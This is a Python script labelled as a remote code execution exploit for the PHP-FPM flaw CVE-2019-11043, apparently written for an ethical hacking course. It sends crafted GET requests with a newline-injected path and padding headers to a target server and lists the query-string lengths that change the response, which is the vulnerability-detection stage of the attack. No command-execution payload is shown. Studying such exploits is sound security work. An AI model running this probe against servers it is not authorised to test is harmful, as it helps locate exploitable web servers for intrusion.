"""
CVE-2019-11043 Remote Code Execution on PHP-FPM
See https://github.com/neex/phuip-fpizdam for the original Go implementation.

Sam Lindemer 2020, FEP3370 Advanced Ethical Hacking
"""

import sys, time
from http import client
from urllib.parse import urlparse, quote

'''
This is a wrapper around Python's standard HTTP client library tailored to this
particular exploit. This exploit involves sending many GET requests with varying
amounts of padding to detect whether the vulnerability is present.
'''
class Requester:

    def __init__(self, resource):
        self.url = urlparse(resource)
        self.conn = client.HTTPConnection(self.url.netloc, timeout=30)

    def request(self, pathinfo, qsl, pad):

        # resource path must begin with a '/'
        if pathinfo[0] != '/': pathinfo = '/' + pathinfo

        # format the query string with escape characters
        path = quote(self.url.path + pathinfo)

        # the length change in query string length after formatting must be even
        qsl_delta = len(path) - len(pathinfo) - len(quote(self.url.path))
        assert(qsl_delta % 2 == 0)

        # check that the query string length is long enough 
        qsl_prime = int(qsl - qsl_delta / 2)
        if qsl_prime < 0: raise Warning

        self.conn.putrequest("GET", path + '?' + 'Q' * qsl_prime, \
                skip_accept_encoding=True)
        self.conn.putheader("User-Agent", "Mozilla/5.0")
        self.conn.putheader("Padding", 'X' * pad)
        self.conn.putheader("More", "padding")
        self.conn.endheaders()
        return self.conn.getresponse()

def detect(requester):
    qsl_candidates = []

    base_resp = requester.request("/path\ninfo/php", 1500, 1)
    base_resp.read()

    for qsl in range(1500, 1950, 5):
        resp = requester.request("/KTH\nAdvancedEthicalHacking.php", qsl, 1)
        if resp.status != base_resp.status:
            qsl_candidates.append(qsl)
        resp.read()

    print(qsl_candidates)

if __name__ == "__main__":

    if len(sys.argv) != 2:
        print("Usage: exploit.py <address>:<port>/<resource>.php")
        exit()

    requester = Requester(sys.argv[1]) 
    detect(requester)
